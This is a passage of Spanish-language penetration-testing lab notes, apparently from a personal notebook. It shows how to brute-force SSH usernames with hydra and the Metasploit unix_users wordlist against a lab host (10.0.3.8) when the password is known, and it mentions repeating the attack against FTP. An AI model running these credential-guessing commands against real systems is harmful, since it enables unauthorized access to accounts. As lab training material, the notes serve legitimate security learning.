En este caso sabremos la contraseña pero no el usuario.

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 22.png|image 22.png]]

  

- Vamos a suponer que no se cual es el usuario pero si la **contraseña** que es **alexis.**
    
    **NOTA:** Mirar la sección Notas el punto numero 2 y el 3 para los diccionarios de usuarios.
    
    ```Bash
    hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://10.0.3.8
    ```
    
    Usaremos el diccionario **unix_users.txt** para encontrar usuarios.
    
    ![[Imagenes/image 1 11.png|image 1 11.png]]
    
    **No a encontrado el usuario 😲. Si pasa esto debemos seguir intentándolo con otros diccionarios.**
    
      
    
    - En este caso al ser una practica de concepto vamos a añadir a mano el nombre del usuario (que conocemos del ejercicio anterior **Parte 1)** en el diccionario.
        
        ```Bash
        sudo nano /usr/share/wordlists/metasploit/unix_users.txt
        ```
        
        ![[Imagenes/image 2 10.png|image 2 10.png]]
        

  

- Vamos a volver a repetir el ataque con hydra.
    
    ```Bash
    hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://10.0.3.8
    ```
    
    ![[Imagenes/image 3 9.png|image 3 9.png]]
    

  

  

- Esta vez vamos ha hacer exactamente igual pero **atacando al protocolo FTP**.
    
    ![[Imagenes/image 4 8.png|image 4 8.png]]